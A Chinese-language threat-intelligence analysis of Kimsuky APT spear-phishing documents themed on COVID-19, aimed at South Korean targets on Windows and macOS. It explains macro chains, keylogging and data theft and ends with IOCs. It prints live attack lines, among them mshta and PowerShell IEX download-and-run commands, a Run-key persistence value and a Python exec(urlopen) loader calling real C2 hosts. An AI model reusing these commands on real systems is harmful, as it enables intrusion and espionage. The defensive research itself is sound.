Kimsuky APT组织利用疫情话题针对南韩进行双平台的攻击活动的分析

![图片1 封面](https://i.loli.net/2020/03/23/sUIf2qbC5P9Kji3.png)

## 一.前言

`kimsuky` APT组织(又名 **Mystery Baby, Baby Coin, Smoke Screen, BabyShark, Cobra
Venom** )
,该组织一直针对于韩国的智囊团,政府组织,新闻组织,大学教授等等进行活动.并且该组织拥有`windows`平台的攻击能力,载荷便捷,阶段繁多。并且该组织十分活跃.其载荷有
**带有漏洞的hwp文件,恶意宏文件,释放载荷的PE文件** 等

近日,随着海外病例的增加,使用新型冠状病毒为题材的攻击活动愈来愈多.例如:
**海莲花APT组织通过白加黑的手段向中国的政府部门进行鱼叉投递,摩诃草APT组织冒充我国的重点部门针对政府和医疗部门的攻击活动,毒云藤和蓝宝菇组织通过钓鱼的方式窃取人员的邮箱密码,借以达到窃密或者是为下一阶段做准备的目的以及蔓灵花组织继续采用SFX文档的方式对我国重点设施进行投放.**

同时,在朝鲜半岛的争夺也随之展开.`Gcow`安全团队 **追影小组**
在日常的文件监控之中发现名为`kimsuky`APT组织采用邮件鱼叉的方式针对韩国的新闻部门,政府部门等进行攻击活动,并且在此次活动之中体现出该组织在攻击过程中使用
**轻量化,多阶段脚本载荷** 的特点.并且在本次活动中我们看到了该组织使用`python`针对`MacOS`平台进行无文件的攻击活动.

下面笔者将从攻击`Windows`平台的样本以及攻击`MacOs`平台的样本进行分析

## 二.Windwos平台样本分析:

### 1.코로나바이러스 대응.doc(冠状病毒反应.doc)

#### 0x00.样本信息:

样本信息| 코로나바이러스 대응(冠状病毒反应)  
---|---  
样本名称| 코로나바이러스 대응.doc(冠状病毒反应.doc)  
样本MD5| A9DAC36EFD7C99DC5EF8E1BF24C2D747  
样本SHA-1| CBB8985404281455BBCF02354060FB1E7576D4C2  
样本SHA-256| 2CD5F1852AC6D3ED481394EA0ABC49F16789C12FB81BCDF9988762730FB0AA8F  
利用方法| 宏  
样本类型| Microsoft Word 2007+  
样本大小| 81.13 KB  
最初上传时间| 2020-02-27 08:52:50  
  
该样本利用 **社会工程学** 的办法，诱使目标点击“ **启用内容** ”来执行宏的恶意代码。启用宏后显示的正文内容。通过谷歌翻译，提取到几个关键词：
**新型冠状病毒** 可以看出，这可能是针对 **韩国政府** 发起的一次攻击活动。

![诱饵文档原文以及翻译](https://i.loli.net/2020/03/21/Z1qoCwfKVBMWE5z.png)

攻击者通过 **鱼叉邮件附件** 的方式将恶意载荷投递给受害目标

![钓鱼邮件附件](https://i.loli.net/2020/03/21/juMafKpXRSnDvbd.png)

#### 0x01. 样本分析

利用`olevba`工具提取的宏代码如下:其将执行的命令通过`hex编码`的形式在宏里面自己解码后隐藏执行所执行的命令为:

`mshta
<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/search.hta> /f`

![执行mshta命令加载search.hta](https://i.loli.net/2020/03/21/TcSdYrqkwh3tCyn.png)

##### search.hta

其主要内嵌的是`vbs`代码,请求`URL`以获取下一段的`vbs`代码,并且执行获取到的`vbs`代码

URL地址为:`<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=1>`

![获取下一段vbs代码并执行](https://i.loli.net/2020/03/21/U4XTmWCgc7d69yJ.png)

##### 1.vbs

下一段的`vbs`代码就是其 **侦查者** 的主体代码:

1.信息收集部分:

收集 **本机名以及本机所在域的名称,ip地址,用户名称, %programfiles%下的文件, %programfiles%
(x86)下的文件,安装软件信息,开始栏的项目,最近打开的项目,进程列表,系统版本信息,set设置信息,远程桌面连接信息, ,arp信息,
%appdata%\Microsoft下所有文件以及子文件信息,文档文件夹信息,下载文件信息,powershell文件夹下的文件信息，盘符信息,宏的安全性信息,outlook信息**
等等

![信息收集1](https://i.loli.net/2020/03/21/JvZ67LQeNXT9V2l.png)

![信息收集2](https://i.loli.net/2020/03/22/twRWGkNdslYeMU9.png)

2.添加计划任务以布置下一阶段的载荷:

伪装成`Acrobat`更新的任务

执行命令: `mshta
<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/cfhkjkk.hta>`

获取当前时间,延迟后执行`schtasks`创造该计划任务

![schtasks创造计划任务](https://i.loli.net/2020/03/21/dYJ1WzlENDMfQbL.png)

##### cfhkjkk.hta

和`search.hta`一样,也是一样的中转的代码,URL为:`<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=2>`

![图片10 中转hta](https://i.loli.net/2020/03/23/nXJoUZ2ce9dA4Ft.png)

##### 2.vbs

其同样也是`vbs`文件.其主要的功能是查看 **%Appdata%\Windows\desktop.ini** 是否存在,如果存在则利用
**certutil -f -encode** 对文件进行编码并且输出为 **%Appdata%\Windows\res.ini**
,并且从URL地址下载`<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/download.php?param=res1.txt>`编码后的`powershell`命令隐藏执行,执行成功后删除
**Appdata%\Windows\desktop.ini**.并且从URL地址下载`<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/download.php?param=res2.txt>`编码后的`powershell`命令隐藏执行.

![图片11 2.vbs](https://i.loli.net/2020/03/23/TWIBopdO5U1wH6C.png)

##### res1.txt

该`powershell`命令主要功能就是读取 **Appdata%\Windows\res.ini**
文件里的内容,再组成`HTTP`报文后利用`UploadString`上传到`C2`,`C2`地址为:`<http://vnext.mireene.com/theme/basic/skin/member/basic/upload/wiujkjkjk.php>`

![图片12 res1.txt](https://i.loli.net/2020/03/23/oA4ncWQ8rIg5Chk.png)

##### res2.txt

该`powershell`命令主要功能是通过对比按键`ASCII`码值记录信息

我们可以看到被黑的站点是一个购物平台,攻击者应该入侵这个购物平台后把相应的恶意载荷挂到该网站.

![所入侵的网站截图](https://i.loli.net/2020/03/21/lnWvhIDpLceXYsV.png)

![网站内容翻译](https://i.loli.net/2020/03/21/sQJEABpg2UozjyK.png)

此外我们通过比较相同的宏代码发现了其一个类似的样本

### 2.비건 미국무부 부장관 서신 20200302.doc(美国国务卿素食主义者20200302.doc)

#### 0x00.样本信息

样本信息| 비건 미국무부 부장관 서신 20200302(美国国务卿素食主义者20200302)  
---|---  
样本名称| 비건 미국무부 부장관 서신 20200302.doc(美国国务卿素食主义者20200302.doc)  
样本MD5| 5F2D3ED67A577526FCBD9A154F522CCE  
样本SHA-1| 15042D5B394E4867014525276FCBA54C52208B8B  
样本SHA-256| 7C0F8D6CF4F908CCE8B7F65F2B5EE06A311D28EE6D8F1B32E90AF4D08C2AB327  
利用方法| 宏  
样本类型| Microsoft Word 2007+  
样本大小| 85.67 KB  
最初上传时间| 2020-03-03 04:20:21  
  
![诱饵文档原文以及翻译](https://i.loli.net/2020/03/21/dt2XPSOMpUxrWn9.png)

该样本利用 **社会工程学** 的办法，诱使目标点击“ **启用内容** ”来执行宏的恶意代码。启用宏后显示的正文内容。通过谷歌翻译，提取到几个关键词：
**朝鲜半岛 政策** 。可以看出，这可能是针对 **韩国政府机构** 发起的一次攻击活动。

#### 0x01 样本分析

其与上文所述相同不过,本样本执行的命令是:

`mshta
<http://nhpurumy.mireene.com/theme/basic/skin//member/basic/upload/search.hta>
/f`

![用mshta加载search.hta](https://i.loli.net/2020/03/21/AuGhXPUNM6Vpjda.png)

相同的中转`search.hta`

中转地址为:`<http://nhpurumy.mireene.com/theme/basic/skin/member/basic/upload/eweerew.php?er=1>`

![获取下一阶段vbs代码并且执行](https://i.loli.net/2020/03/21/4AYc3SzlJeTjxpG.png)

其执行的vbs代码与上文类似,在这里就不做赘述了.不过其计划任务所执行的第二部分`hta`的`url`地址为:`<http://nhpurumy.mireene.com/theme/basic/skin/member/basic/upload/cfhkjkk.hta>`

![添加计划任务并且延迟执行](https://i.loli.net/2020/03/21/ipru3sbCvDVMLAa.png)

之后的部分代码与上文相同,不过其`C2`的地址为`nhpurumy.mireene.com`。在此就不赘述了。

被入侵的网站可能是一个广告公司:

![被入侵公司官网截图](https://i.loli.net/2020/03/21/cyaeDurs4RnZmWA.png)

![被入侵公司官网内容](https://i.loli.net/2020/03/21/jlQXUKD1wCgs9nP.png)

### 3.붙임. 전문가 칼럼 원고 작성 양식.doc（附上.专家专栏手稿表格.doc）

#### 0x01文档信息:

##### 样本信息:

样本信息| 붙임. 전문가 칼럼 원고 작성 양식（附上.专家专栏手稿表格）  
---|---  
文件名称| 붙임. 전문가 칼럼 원고 작성 양식.doc  
样本MD5| 07d0be79be38ecb8c7b1c80ab0bd8344  
样本SHA1| 3acfda840986f215bec88cefa0dfb34b44750508  
样本SHA256| 1fcd9892532813a27537f4e1a1c21ec0c110d6b3929602750ed77bbba7caa426  
利用方法| 宏  
样本类型| Microsoft Word 2007+  
样本大小| 112.96KB  
VT最初上传时间| 2020-03-18 01:47:59  
  
该样本利用 **社会工程学** 的办法，诱使目标点击“ **启用内容** ”来执行宏的恶意代码。启用宏后显示的正文内容。通过谷歌翻译，提取到几个关键词：
**稿件、专家专栏** 。可以看出，这可能是针对 **韩国新闻机构** 发起的一次攻击活动。

![诱饵文档内容以及翻译](https://i.loli.net/2020/03/20/7sUMOp3rA2lkQbI.png)

#### 0x02 恶意宏分析

利用`olevba`工具提取的宏代码如下:

![olevba提取宏代码](https://i.loli.net/2020/03/20/1cpmGEVPDwiSNfe.png)

 **显示文档的内容:**

![显示文档内容](https://i.loli.net/2020/03/20/FB4pMzZhfEUQImk.png)

隐藏执行`powershell.exe`代码读取`%TEMP%\bobo.txt`的内容,并且使用`iex`执行

![隐藏执行powershell执行bobo.txt里内容](https://i.loli.net/2020/03/20/UZi9tyepPsmolgF.png)

`Bobo.txt`内容

![Bobo.txt中的内容](https://i.loli.net/2020/03/20/FicAg9rVB63jmqx.png)

从`<http://mybobo.mygamesonline.org/flower01/flower01.ps1>`上下载第二段`powershell`载荷`flower01.ps1`并且利用`iex`内存执行

第二段`powershell`载荷如图所示:

![第二段powershell载荷](https://i.loli.net/2020/03/20/gnhwMcuC8oNvZxe.png)

#### 0x03 恶意powershell分析

Powershell后门配置信息:

![第二段powershell载荷配置信息](https://i.loli.net/2020/03/20/5WOvHmaT91sQSph.png)

写入注册表启动项,键名: `Alzipupdate`,键值:

    
    
    cmd.exe /c powershell.exe -windowstyle hidden IEX (New-Object System.Net.WebClient).DownloadString('http://mybobo.mygamesonline.org/flower01/flower01.ps1')

开机启动就远程执行本ps1文件

![添加注册表以开机启动](https://i.loli.net/2020/03/20/xGaC38IuVNtHwpU.png)

收集信息: **最近使用的项目(文件),%ProgramFiles%以及C:\Program Files (x86)下的文件,系统信息,当前进程信息**

![收集本机信息](https://i.loli.net/2020/03/20/IhoG6ABQ5gkn7rR.png)

将这些结果写入`%Appdata%\flower01\flower01.hwp`中

![将收集结果写入flower01.hwp中](https://i.loli.net/2020/03/20/xU9SFCMvmEAqyc5.png)

`Flower01.hwp`内容:

![flower01.hwp内容](https://i.loli.net/2020/03/20/dP4ymJGlTk6qRhB.png)

将收集到的信息循环上传到`C2`并且接收回显执行

![将收集到的信息上传到c2](https://i.loli.net/2020/03/20/KnRB8IphOxloCeg.png)

 **上传函数:**

将数据上传到`<http://mybobo.mygamesonline.org/flower01/post.php>`

![上传flower01.hwp文件](https://i.loli.net/2020/03/20/cG6JAWgFK97OVUt.png)

![具体上传代码](https://i.loli.net/2020/03/20/O4f7dUezwIHXJAj.png)

 **下载函数:**

请求URL地址:`<http://mybobo.mygamesonline.org/flower01/flower01.down>`获得第二阶段被加密的载荷,解密后通过添加代码块以及新建工作的方式指行第二段载荷

![下载解密并执行](https://i.loli.net/2020/03/20/OxYN43zUpnCqbag.png)

执行完毕后向`C2`地址请求:"`<http://mybobo.mygamesonline.org/flower01/del.php?filename=flower01>`"标志载荷已经
**执行成功**

![反馈执行成功信息](https://i.loli.net/2020/03/20/HWeq1Chxn4k6aoG.png)

为了方便各位看官理解,刻意绘制了两张流程图描述该后门的情况

图一如下: 是第三个样本的流程图 全过程 **存在一个恶意文件落地**.

![kimsuky针对windows平台攻击的样本流程图\(一\)](https://i.loli.net/2020/03/21/ubZo1EPekO48fwC.png)

图二如下: 是前两个样本的流程图 全过程 **无任何恶意文件落地**

![kimsuky针对windows平台攻击的样本流程图\(二\)](https://i.loli.net/2020/03/23/F4RamG3wcEp8sXJ.png)

## 三.MacOS平台的样本分析:

### 1.COVID-19 and North Korea.docx(COVID-19与朝鲜.docx)

#### 0x00. 样本信息

样本信息| COVID-19 and North Korea(COVID-19与朝鲜)  
---|---  
样本名称| COVID-19 and North Korea.docx  
样本MD5| A4388C4D0588CD3D8A607594347663E0  
样本SHA-1| B066369BBD48B7858F2C1EED1E78D85C8AE4CDB6  
样本SHA256| 7D2B9F391588CC07D9BA78D652819D32D3D79E5A74086B527C32126AD88B5015  
利用方式| 远程模板注入 + 宏  
样本类型| Microsoft Word 2007+  
样本大小| 220.16 KB (225448 bytes)  
VT最初上传时间| 2020-03-19 11:04:09  
  
#### 0x01 样本分析

该样本是docx文件,攻击者运用 **社会工程学** 的手法,设置了一张在`MAC`系统启动宏文档的图片,来诱导受害者点击启动宏,
**当受害者启动宏后该样本就会移除图片显示出文档的内容**

![诱饵文档内容与翻译](https://i.loli.net/2020/03/20/5xfVJUE6qd4ANRX.png)

由此可见,我们可以看到该样本与 **新型冠状病毒** 的话题有关,可能针对的是 **韩国的政府机构**

该样本利用 **远程模板注入技术** 对远程模板进行加载

远程模板URL:"`<http://crphone.mireene.com/plugin/editor/Templates/normal.php?name=web>`"

![远程模板注入技术](https://i.loli.net/2020/03/20/Mz1AHdBR8JqX2ca.png)

宏代码会将之前遮盖的部分显示,用以迷惑受害者,相关代码:

![去掉保护显示文档](https://i.loli.net/2020/03/20/NZo5IncgCl6k1dQ.png)

该样本会判断是否是`MAC`系统,若是`MAC`系统就会执行`python`命令下载第一阶段的`python`代码

命令为:

    
    
    python -c exec(urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v1')).read())

![执行第一阶段python恶意代码](https://i.loli.net/2020/03/20/JCs1yxNiXAjm245.png)

第一阶段的`python`代码主要起到一个中转的作用

其会执行如下代码去加载第二阶段的`python`代码:

    
    
    urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=v60')).read()

![执行第二阶段python恶意代码](https://i.loli.net/2020/03/20/AKxtHi1QXkvYZ9d.png)

第二段`python`代码类似于一个侦察者:

##### a.收集信息

其会收集 **系统位数信息,系统信息,所安装的APP列表, 文件列表, 下载文件列表, 盘符信息**
等,并且将这些数据写入对应的`txt`文件中于恶意样本所创造的工作目录下

![收集信息](https://i.loli.net/2020/03/20/xsCWNFnoew8JVpz.png)

##### b.打包所收集的信息

首先先删除`backup.rar`文件,再将工作目录下的所有txt文件利用 **zip -m -z** 命令进行打包,输出为`backup.rar`文件

![打包信息](https://i.loli.net/2020/03/20/mZqaCg6NysXbH3M.png)

##### c.将收集的信息回传到C2

通过创建`Http`链接,将`rar`的数据组成 **报文** ,发送到`C2`:
`<http://crphone.mireene.com/plugin/editor/Templates/upload.php>`

![将信息上传到C2](https://i.loli.net/2020/03/20/9I4lu6OCV7vLnrt.png)

##### d.向C2请求获取新的python代码

更新代码:

    
    
    urllib2.urlopen(urllib2.Request('http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new')).read()

从`<http://crphone.mireene.com/plugin/editor/Templates/filedown.php?name=new>`获取新的`Python`载荷

![获取下一阶段python载荷](https://i.loli.net/2020/03/20/o5Rc417KTZvaPwh.png)

其创造一个线程, **循环执行收集机器信息并且上传,不断向C2请求执行新的python代码**
,中间休息`3`00秒,这也解释了为什么在打包信息的时候需要先删除`backup.rar`

![循环执行收集机器信息并且上传,不断向C2请求执行新的python代码](https://i.loli.net/2020/03/20/mD6EStJb9gzXMCl.png)

从本次C2的域名: `crphone.mireene.com`来看,应该是一个卖智能手机的网站

![被入侵网站页面](https://i.loli.net/2020/03/20/i9R5dsOUWqDQBpu.png)

![页面里的内容](https://i.loli.net/2020/03/20/ctEURfvbMCgHBs2.png)

为了方便各位看官理解,笔者绘制了一张流程图:![kimsuky针对macos平台无文件攻击的样本的流程图](https://i.loli.net/2020/03/20/siWpMV4B7jnfcJr.png)

## 四.关联与总结:

### 1.关联

#### (1).组成上线报文的特征

在`kimsuky`
APT组织之前的样本中所组成的上线报文中含有类似于`7e222d1d50232`以及`WebKitFormBoundarywhpFxMBe19cSjFnG`的特征上线字符

**WebKitFormBoundarywhpFxMBe19cSjFnG:**

![图片55 关联-特征上线报文\(一\)](https://i.loli.net/2020/03/23/ORQSjTDMEL82yxt.png)

**7e222d1d50232:**

![图片56 关联-特征上线报文\(二\)](https://i.loli.net/2020/03/23/lxTwW6Vi4AcdqGZ.png)

#### (2).信息收集代码相似性

在`kimsuky` APT组织之前的样本中,我们发现了该组织在进行`windows`平台下的信息收集代码存在很大的相似性.比如
**收集信息所使用的命令** ,包含了上文所提到的各类信息收集的内容.虽然在较新的时候做了简化.但是依旧可以反映出二者的同源性

![图片57 关联-信息收集代码相似性](https://i.loli.net/2020/03/23/7vlOP5M6BKQ4o1g.png)

### 2.总结

 **kimsukyAPT组织是值得关注的威胁者**

`Kimsuky` **APT** 组织作为一个十分活动的APT组织,其针对南韩的活动次数也愈来愈多,同时该组织不断的使用
**hwp文件,释放诱饵文档可执行文件（scr）,恶意宏文档** 的方式针对 **Windows** 目标进行相应的攻击.同时 **恶意宏文档**
还用于攻击 **MacOs** 目标之中,这与相同背景的 **Lazarus**
组织有一定的相似之处,该组织拥有了针对`windows`,`MacOs`两大平台的攻击能力。日后说不一定会出现`Andorid`端的攻击框架。

同时该组织的载荷也由之前的`PE`文件载荷逐渐变为 **多级脚本**
载荷,这不仅仅增加了其灵活性,而且有助于其逃过部分杀毒软件的查杀.但是其混淆的策略不够成熟,所以其对规避杀软的能力还是较弱。

并且该组织的后门逐渐采取少落地或者不落地的方式,这在一定层面上加大了检测的难度.但是其没有考虑到`AMSI`以及`scriptblock`等.所以杀毒软件依旧是可以进行防护的.

最后,该组织的成员应该是通过
**入侵该网站后在该网站下挂上了部署C2以做好白名单策略,减少被目标防护软件的检测的概率**.比如在这次活动中,其入侵带有动态域名的网站将载荷不至于上面。同时该税法也在之前的活动中有所体现。

正如一开始所讲的那样该组织是一个很值得关注的威胁者.不过该组织现在仍然处于上身阶段,其不断进行自我的更新以及广撒网式的大量投递样本也表现出其的不成熟性,但这更需要我们保持警惕.以及与之有相同背景的`Group123`以及`Konni`APT组织.

## 五.IOCs:

### MD5:

757a71f0fbd6b3d993be2a213338d1f2

5f2d3ed67a577526fcbd9a154f522cce

07D0BE79BE38ECB8C7B1C80AB0BD8344

A4388C4D0588CD3D8A607594347663E0

5EE1DE01EABC7D62DC7A4DAD0B0234BF

1B6D8837C21093E4B1C92D5D98A40ED4

A9DAC36EFD7C99DC5EF8E1BF24C2D747

163911824DEFE23439237B6D460E8DAD

9F85509F94C4C28BB2D3FD4E205DE857

5F2D3ED67A577526FCBD9A154F522CCE

### C2:

vnext[.]mireene[.]com

nhpurumy[.]mireene[.]com

mybobo[.]mygamesonline[.]org

crphone[.]mireene[.]com

### URL:

vnext[.]mireene[.]com/theme/basic/skin//member/basic/upload/search[.]hta

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=1

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/cfhkjkk[.]hta

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=2

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res1.txt

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res2.txt

vnext[.]mireene[.]com/theme/basic/skin/member/basic/upload/wiujkjkjk[.]php

nhpurumy[.]mireene[.]com/theme/basic/skin//member/basic/upload/search[.]hta

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=1

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/cfhkjkk[.]hta

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/eweerew[.]php?er=2

/nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res1.txt

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/download[.]php?param=res2.txt

nhpurumy[.]mireene[.]com/theme/basic/skin/member/basic/upload/wiujkjkjk[.]php

crphone[.]mireene[.]com/plugin/editor/Templates/normal[.]php?name=web

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=v1

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=v60

crphone[.]mireene[.]com/plugin/editor/Templates/upload[.]php

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=new

crphone[.]mireene[.]com/plugin/editor/Templates/filedown[.]php?name=normal

mybobo[.]mygamesonline[.]org/flower01/post[.]php

mybobo[.]mygamesonline[.]org/flower01/flower01[.]down

mybobo[.]mygamesonline[.]org/flower01/del[.]php?filename=flower01

mybobo[.]mygamesonline[.]org/flower01/flower01.ps1

## 六.参考链接:

<https://mp.weixin.qq.com/s/ISVYVrjrOUk4bzK5We6X-Q>

<https://blog.alyac.co.kr/2779>

关注公众号获取更多技术文章

![qrcode_for_gh_f444cf1f314b_258\(1\)](https://image.3001.net/images/20200323/1584945302_5e7858962b1e9.jpg!small)

